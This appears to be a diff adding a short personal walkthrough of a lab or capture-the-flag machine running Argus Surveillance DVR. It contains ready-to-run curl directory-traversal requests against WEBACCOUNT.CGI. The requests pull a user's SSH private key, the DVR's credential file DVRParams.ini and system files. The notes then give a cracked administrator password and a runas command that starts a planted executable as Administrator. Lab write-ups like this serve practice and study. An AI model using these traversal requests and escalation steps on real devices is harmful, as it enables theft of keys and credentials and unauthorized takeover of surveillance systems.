@@ -1,0 +1,23 @@
+Initial Foothold:
+
+SO DAMN CLOSE... So theres administrator and viewer right... tried to fins ssh keys for administrator but not for viewer? JUST ASSUME THAT VIEWER IS A USER ACCOUNT ON THE SYSTEM AS WELL EVEN THOUGH IT LOOKS LIKE IT IS ONLY RELATED TO ARGUS SURVEILLANCE!!!!!!!
+
+Directory Traversal
+
+curl "http://192.168.123.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > arguskey
+
+curl "http://192.168.123.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FAdministrator%2FDesktop%2Fproof.txt&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+curl "http://192.168.123.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus+Surveillance+DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+curl "http://192.168.123.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
+
+PrivEsc:
+
+Password Cracker
+https://leobreaker1411.github.io/blog/dvr4-hash-crack
+based on docs, he did not do special chars so we need to do it, char by char
+get password 14WatchD0g$
+
+run command as administrator, today we learn lol 
+runas /env /profile /user:DVR4\Administrator "C:\Users\Viewer\Desktop\LOL.exe"
